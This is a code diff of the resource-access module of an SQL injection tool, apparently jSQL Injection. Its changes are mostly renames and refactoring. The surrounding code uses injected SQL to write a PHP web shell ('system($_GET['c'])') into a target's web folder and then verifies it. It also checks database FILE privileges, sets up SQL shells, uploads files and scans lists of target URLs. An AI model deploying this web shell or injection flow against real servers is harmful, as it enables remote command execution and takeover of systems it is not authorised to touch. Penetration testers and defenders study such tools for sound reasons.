@@ -38,9 +38,10 @@ import org.apache.log4j.Logger;
 
 import com.jsql.model.InjectionModel;
 import com.jsql.model.MediatorModel;
-import com.jsql.model.accessible.bean.Request;
+import com.jsql.model.bean.util.Request;
 import com.jsql.model.exception.PreparationException;
 import com.jsql.model.exception.StoppableException;
+import com.jsql.model.injection.method.MethodInjection;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.ConnectionUtil;
 import com.jsql.util.StringUtil;
@@ -93,7 +94,7 @@ public class RessourceAccess {
     /**
      * True if current user has right to read file. 
      */
-    public static boolean isReadingAllowed = false;
+    public static boolean readingIsAllowed = false;
 
     /**
      * Check if every page in the list responds 200 OK.
@@ -138,7 +139,7 @@ public class RessourceAccess {
                     Request request = new Request();
                     request.setMessage("CreateAdminPageTab");
                     request.setParameters(currentCallable.getUrl());
-                    MediatorModel.model().interact(request);
+                    MediatorModel.model().sendToViews(request);
 
                     nbAdminPagesFound++;
                 }
@@ -164,7 +165,7 @@ public class RessourceAccess {
 
         Request request = new Request();
         request.setMessage("EndAdminSearch");
-        MediatorModel.model().interact(request);
+        MediatorModel.model().sendToViews(request);
     }
     
     /**
@@ -184,12 +185,12 @@ public class RessourceAccess {
             pathShellFixed += "/";
         }
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile("<SQLi><?php system($_GET['c']); ?><iLQS>", pathShellFixed + FILENAME_WEBSHELL)
+            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi><?php system($_GET['c']); ?><iLQS>", pathShellFixed + FILENAME_WEBSHELL)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_WEBSHELL),
+            MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_WEBSHELL),
             sourcePage,
             false,
             1,
@@ -203,14 +204,14 @@ public class RessourceAccess {
 
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.initialUrl.substring(0, ConnectionUtil.initialUrl.lastIndexOf('/') + 1);
+            url = ConnectionUtil.urlByUser.substring(0, ConnectionUtil.urlByUser.lastIndexOf('/') + 1);
         }
 
         if (hexResult.indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
             Request request = new Request();
             request.setMessage("CreateShellTab");
             request.setParameters(pathShellFixed, url);
-            MediatorModel.model().interact(request);
+            MediatorModel.model().sendToViews(request);
         } else {
             LOGGER.warn("Web shell not usable.");
         }
@@ -258,7 +259,7 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage("MessageHeader");
             request.setParameters(msgHeader);
-            MediatorModel.model().interact(request);
+            MediatorModel.model().sendToViews(request);
         } catch (IOException e) {
             LOGGER.error(e, e);
         } finally {
@@ -266,7 +267,7 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage("GetShellResult");
             request.setParameters(uuidShell, result, command);
-            MediatorModel.model().interact(request);
+            MediatorModel.model().sendToViews(request);
         }
     }
 
@@ -300,12 +301,12 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile(s, pathShellFixed + FILENAME_SQLSHELL)
+            MediatorModel.model().vendor.getValue().getSqlTextIntoFile(s, pathShellFixed + FILENAME_SQLSHELL)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_SQLSHELL),
+            MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_SQLSHELL),
             sourcePage,
             false,
             1,
@@ -319,14 +320,14 @@ public class RessourceAccess {
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.initialUrl.substring(0, ConnectionUtil.initialUrl.lastIndexOf('/') + 1);
+            url = ConnectionUtil.urlByUser.substring(0, ConnectionUtil.urlByUser.lastIndexOf('/') + 1);
         }
 
         if (hexResult.indexOf(s) > -1) {
             Request request = new Request();
             request.setMessage("CreateSQLShellTab");
             request.setParameters(pathShellFixed, url, username, password);
-            MediatorModel.model().interact(request);
+            MediatorModel.model().sendToViews(request);
         } else {
             LOGGER.warn("SQL shell not usable.");
         }
@@ -376,7 +377,7 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage("MessageHeader");
             request.setParameters(msgHeader);
-            MediatorModel.model().interact(request);
+            MediatorModel.model().sendToViews(request);
         } catch (IOException e) {
             LOGGER.error(e, e);
         } finally {
@@ -384,7 +385,7 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage("GetSQLShellResult");
             request.setParameters(uuidShell, result, command);
-            MediatorModel.model().interact(request);
+            MediatorModel.model().sendToViews(request);
         }
     }
 
@@ -409,12 +410,12 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShell +"<iLQS>", pathFileFixed + FILENAME_UPLOAD)
+            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShell +"<iLQS>", pathFileFixed + FILENAME_UPLOAD)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathFileFixed + FILENAME_UPLOAD),
+            MediatorModel.model().vendor.getValue().getSqlReadFile(pathFileFixed + FILENAME_UPLOAD),
             sourcePage,
             false,
             1,
@@ -428,7 +429,7 @@ public class RessourceAccess {
 
         String url = urlFile;
         if ("".equals(url)) {
-            url = ConnectionUtil.initialUrl.substring(0, ConnectionUtil.initialUrl.lastIndexOf('/') + 1);
+            url = ConnectionUtil.urlByUser.substring(0, ConnectionUtil.urlByUser.lastIndexOf('/') + 1);
         }
 
         if (hexResult.indexOf(phpShell) > -1) {
@@ -502,7 +503,7 @@ public class RessourceAccess {
                 Request request = new Request();
                 request.setMessage("MessageHeader");
                 request.setParameters(msgHeader);
-                MediatorModel.model().interact(request);
+                MediatorModel.model().sendToViews(request);
             } catch (Exception e) {
                 LOGGER.error(e, e);
             } finally {
@@ -523,7 +524,7 @@ public class RessourceAccess {
         
         Request request = new Request();
         request.setMessage("EndUpload");
-        MediatorModel.model().interact(request);
+        MediatorModel.model().sendToViews(request);
     }
     
     /**
@@ -536,7 +537,7 @@ public class RessourceAccess {
         String[] sourcePage = {""};
 
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlPrivilegeCheck(),
+            MediatorModel.model().vendor.getValue().getSqlPrivilegeCheck(),
             sourcePage,
             false,
             1,
@@ -547,22 +548,22 @@ public class RessourceAccess {
             MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
-            MediatorModel.model().interact(request);
-            isReadingAllowed = false;
+            MediatorModel.model().sendToViews(request);
+            readingIsAllowed = false;
         } else if ("false".equals(hexResult)) {
             LOGGER.warn("No FILE privilege");
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
-            MediatorModel.model().interact(request);
-            isReadingAllowed = false;
+            MediatorModel.model().sendToViews(request);
+            readingIsAllowed = false;
         } else {
             Request request = new Request();
             request.setMessage("MarkFileSystemVulnerable");
-            MediatorModel.model().interact(request);
-            isReadingAllowed = true;
+            MediatorModel.model().sendToViews(request);
+            readingIsAllowed = true;
         }
         
-        return isReadingAllowed;
+        return readingIsAllowed;
     }
     
     /**
@@ -597,7 +598,7 @@ public class RessourceAccess {
                     Request request = new Request();
                     request.setMessage("CreateFileTab");
                     request.setParameters(name, content, path);
-                    MediatorModel.model().interact(request);
+                    MediatorModel.model().sendToViews(request);
 
                     if (!duplicate.contains(path.replace(name, ""))) {
                         LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
@@ -627,14 +628,14 @@ public class RessourceAccess {
         }
         Request request = new Request();
         request.setMessage("EndFileSearch");
-        MediatorModel.model().interact(request);
+        MediatorModel.model().sendToViews(request);
     }
     
     public static void scanList(List<ListItem> urlList) {
         // Erase everything in the view from a previous injection
         Request requests = new Request();
         requests.setMessage("ResetInterface");
-        MediatorModel.model().interact(requests);
+        MediatorModel.model().sendToViews(requests);
         
         // wait for ending of ongoing interaction between two injections
         try {
@@ -648,9 +649,11 @@ public class RessourceAccess {
         // Display result in console (view definition in model #TODO)
         new ScanListTerminal();
         
+        MediatorModel.model().isScanning = true;
+        
         for (ListItem url: urlList) {
             LOGGER.info("Scanning " + url);
-            MediatorModel.model().controlInput(url.toString(), "", "", "GET", "POST", true);
+            MediatorModel.model().controlInput(url.toString(), "", "", MethodInjection.QUERY, "POST", true);
             
             try {
                 Thread.sleep(500);
@@ -658,9 +661,11 @@ public class RessourceAccess {
                 // nothing
             }
         }
+        
+        MediatorModel.model().isScanning = false;
 
         Request request = new Request();
         request.setMessage("EndScanList");
-        MediatorModel.model().interact(request);
+        MediatorModel.model().sendToViews(request);
     }
 }
